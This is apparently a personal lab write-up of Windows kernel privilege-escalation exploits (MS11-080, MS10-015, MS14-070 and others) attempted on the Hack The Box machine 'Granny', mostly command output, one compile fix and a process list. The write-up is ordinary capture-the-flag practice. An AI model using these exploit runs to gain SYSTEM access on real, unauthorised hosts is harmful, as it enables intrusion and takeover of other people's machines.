### Kernel exploits attempted on HTB Granny

#### MS11-080

```
C:\WINDOWS\Temp\Temp>ms11-080.exe -O 2K3
ms11-080.exe -O 2K3
[>] MS11-080 Privilege Escalation Exploit
[>] Matteo Memelli - ryujin@offsec.com
[>] Release Date 28/11/2011
[+] Retrieving Kernel info...
[+] Kernel version: ntkrnlpa.exe
[+] Kernel base address: 0x80800000L
[+] HalDispatchTable address: 0x8088e078L
[+] Retrieving hal.dll info...
[+] hal.dll base address: 0x80a4c000L
[+] HaliQuerySystemInformation address: 0x80a6ba1eL
[+] HalpSetSystemInformation address: 0x80a6dc60L
[*] Triggering AFDJoinLeaf pointer overwrite...
[*] Spawning a SYSTEM shell...
[*] Restoring token...
[+] Restore done! Have a nice day :)
```

#### MS08-025

```
C:\WINDOWS\Temp\Temp>MS08-025.exe
MS08-025.exe

=====================================================================	
		Microsoft Windows XP SP2  - MS08-025 -		
	win32k.sys NtUserFnOUTSTRING Privilege Escalation Exploit	
=====================================================================	
+ References:
  http://www.microsoft.com/technet/security/bulletin/ms08-025.mspx
  http://www.reversemode.com

[+] \WINDOWS\system32\ntkrnlpa.exe loaded at   	 [ 0x80800000 ]
[+] HalDispatchTable found    			 [ 0x8088E078 ]
[+] NtQueryIntervalProfile 			 [ 0x7C8275BF ]

[+] Executing Shellcode...FAILED!
[+] Exiting...
```

#### MS10-015

```
C:\WINDOWS\Temp\Temp>vdmallowed.exe
vdmallowed.exe
--------------------------------------------------
Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit
-------------------------------------------- taviso@sdf.lonestar.org ---


[+] Spawning a shell to give SYSTEM token (do not close it)
[?] CreateProcess("C:\WINDOWS\SYSTEM32\CMD.EXE") => 732
[?] GetVersionEx() => 5.2
[?] NtQuerySystemInformation() => \WINDOWS\system32\ntkrnlpa.exe@80800000
[?] Searching for kernel 5.2 signature { a1, 1c, ... } ...
[+] Signature found 0x2e97e bytes from kernel base
[+] Starting the NTVDM subsystem by launching MS-DOS executable
[?] CreateProcess("C:\WINDOWS\SYSTEM32\DEBUG.EXE") => 1300
[?] OpenProcess(1300) => 0x7d0
[?] Injecting the exploit thread into NTVDM subsystem @0x7d0
[?] WriteProcessMemory(0x7d0, 0x1070000, "VDMEXPLOIT.DLL", 14);
[?] WaitForSingleObject(0x7e0, INFINITE);
[?] GetExitCodeThread(0x7e0, 0012FF44); => 0x77303074
[+] The exploit thread reports exploitation was successful
[+] w00t! You can now use the shell opened earlier
[+] Press any key to exit...
```

This actually worked, but it spawned a cmd I couldn't get to, since I was on a remote shell and had no RDP access. You could see it in the tasklist with PID 732.

```
C:\WINDOWS\Temp\Temp>tasklist /v
tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
System Idle Process              0 Console                    0         28 K Unknown         NT AUTHORITY\SYSTEM                                     0:26:08 N/A                                                                     
System                           4 Console                    0        236 K Unknown         N/A                                                     0:00:02 N/A                                                                     
smss.exe                       272 Console                    0        460 K Unknown         N/A                                                     0:00:00 N/A                                                                     
csrss.exe                      324 Console                    0      3,348 K Unknown         N/A                                                     0:00:00 N/A                                                                     
winlogon.exe                   348 Console                    0      8,580 K Unknown         N/A                                                     0:00:01 N/A                                                                     
services.exe                   396 Console                    0      5,040 K Unknown         N/A                                                     0:00:00 N/A                                                                     
lsass.exe                      408 Console                    0      7,532 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                    596 Console                    0      2,968 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                    680 Console                    0      3,632 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                    736 Console                    0      3,936 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                    764 Console                    0      3,372 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                    800 Console                    0     19,796 K Running         N/A                                                     0:00:05 SYSTEM AGENT COM WINDOW                                                 
spoolsv.exe                    936 Console                    0      4,104 K Unknown         N/A                                                     0:00:00 N/A                                                                     
msdtc.exe                      964 Console                    0      4,348 K Unknown         N/A                                                     0:00:00 N/A                                                                     
cisvc.exe                     1084 Console                    0      1,260 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                   1124 Console                    0      1,976 K Unknown         N/A                                                     0:00:00 N/A                                                                     
inetinfo.exe                  1180 Console                    0      8,404 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                   1216 Console                    0      1,272 K Unknown         N/A                                                     0:00:00 N/A                                                                     
VGAuthService.exe             1328 Console                    0      8,972 K Unknown         N/A                                                     0:00:00 N/A                                                                     
vmtoolsd.exe                  1408 Console                    0     14,136 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                   1460 Console                    0      5,476 K Unknown         N/A                                                     0:00:00 N/A                                                                     
svchost.exe                   1600 Console                    0      3,756 K Unknown         N/A                                                     0:00:00 N/A                                                                     
alg.exe                       1768 Console                    0      2,732 K Unknown         N/A                                                     0:00:00 N/A                                                                     
wmiprvse.exe                  1824 Console                    0      8,956 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:02 N/A                                                                     
dllhost.exe                   1908 Console                    0      7,008 K Running         N/A                                                     0:00:00 OleMainThreadWndName                                                    
wmiprvse.exe                  2312 Console                    0      6,668 K Running         N/A                                                     0:00:00 Wmi Provider Host                                                       
w3wp.exe                      2344 Console                    0      6,128 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
davcdata.exe                  2412 Console                    0      2,612 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
c.exe                         2540 Console                    0      1,880 K Unknown         N/A                                                     0:00:00 N/A                                                                     
cidaemon.exe                   220 Console                    0        464 K Unknown         N/A                                                     0:00:00 N/A                                                                     
cidaemon.exe                  2208 Console                    0        236 K Unknown         N/A                                                     0:00:02 N/A                                                                     
cidaemon.exe                  2196 Console                    0        900 K Unknown         N/A                                                     0:00:00 N/A                                                                     
logon.scr                     1900 Console                    0      1,456 K Unknown         N/A                                                     0:00:00 N/A                                                                     
shell53.exe                   1756 Console                    0      1,568 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
cmd.exe                       1496 Console                    0      1,452 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
vdmallowed.exe                1940 Console                    0        928 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
cmd.exe                        732 Console                    0      1,368 K Unknown         N/A                                                     0:00:00 N/A                                                                     
tasklist.exe                  2168 Console                    0      3,632 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A  
```

#### MS11-011

```
C:\WINDOWS\Temp\Temp>MS11-011.exe
MS11-011.exe
```

#### MS15-051

```
C:\WINDOWS\Temp\Temp>37049-32.exe
37049-32.exe
```

#### MS14-070

Encountered error during compilation

```
root@Kali:~/HTB/Granny# i586-mingw32msvc-gcc CVE-2014-4076.c -o MS14-070.exe
CVE-2014-4076.c:78:15: error: conflicting types for ‘NTSTATUS’
 typedef DWORD NTSTATUS;
               ^~~~~~~~
In file included from /usr/share/mingw-w64/include/wincrypt.h:766,
                 from /usr/share/mingw-w64/include/windows.h:95,
                 from CVE-2014-4076.c:57:
/usr/share/mingw-w64/include/bcrypt.h:27:16: note: previous declaration of ‘NTSTATUS’ was here
   typedef LONG NTSTATUS,*PNTSTATUS;
                ^~~~~~~~
```

which was fixed when I changed DWORD back to LONG so as not to conflict. But alas, even though the exploit claimed to have spawned a SYSTEM shell I couldn't find said PID.

```
C:\WINDOWS\Temp\Temp>MS14-070.exe
MS14-070.exe
[*] MS14-070 (CVE-2014-4076) x86
    [*] by Tomislav Paskalev
[+] Created a new cmd.exe process
    [*] PID [dec]    :       1404
    [*] PID [hex]    : 0x0000057c
    [*] PID [hex LE] : 0x7c050000
[+] Modified shellcode
[+] Opened TCP/IP I/O device
[*] ntdll.dll address: 0x7C826C8F
[+] Allocated memory
    [*] BaseAddress  : 0x00000000
    [*] RegionSize   : 0x00005000
[*] Writing exploit...
    [+] done
[*] Spawning SYSTEM shell...
    [*] Parent proc hangs on exit
```

#### MS14-040

```
C:\WINDOWS\Temp\Temp>MS14-40-x86.exe
MS14-40-x86.exe
[+] creating socket...
[+] got sock 0x678
[+] sock connected.

[+] GO!
[+] Retrieving Kernel info...
[+] Kernel version: ntkrnlpa.exe
[+] Kernel base address: 0x80800000L
[+] HalDispatchTable address: 0x8088e078L
Traceback (most recent call last):
  File "<string>", line 158, in <module>
TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'
```

#### MS14-058

```
C:\WINDOWS\Temp\Temp>MS14-058.exe
MS14-058.exe

Nothing at all.
```

